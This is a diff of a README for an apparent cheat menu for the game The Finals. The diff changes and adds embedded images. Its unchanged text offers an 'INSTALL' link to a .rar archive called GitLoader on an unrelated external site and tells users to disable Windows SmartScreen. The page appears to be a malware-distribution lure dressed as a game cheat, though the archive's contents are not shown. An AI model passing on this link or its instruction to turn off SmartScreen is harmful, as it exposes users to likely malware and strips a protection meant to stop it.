@@ -1,6 +1,6 @@
 # [Dullwave] The Finals
 
-![1](https://github.com/Vinemoe/TheFinalsDWMenu/assets/155239183/920c2173-56a7-423a-a9e4-d9abf48f6b54)
+![1](https://github.com/Vinemoe/TheFinalsDWMenu/assets/155239183/a2e58ab4-451c-4210-9752-b96a25e6e3fe)
 
 # 📁[𝙸𝙽𝚂𝚃𝙰𝙻𝙻](https://boogi.ma/temp/GitLoader.rar)
 
@@ -15,6 +15,8 @@
 ⭐️Disable Windows Smart Screen and update the Visual C++
 
 ***𝘾𝙪𝙧𝙧𝙚𝙣𝙩 𝙨𝙩𝙖𝙩𝙪𝙨: ✅𝙎𝙩𝙖𝙗𝙡𝙚***
+
+![2](https://github.com/Vinemoe/TheFinalsDWMenu/assets/155239183/53fd7e37-663b-4cd5-8b14-eaf7776054ef)
 
 # ⚙️𝙵𝚞𝚗𝚌𝚝𝚒𝚘𝚗𝚜
 
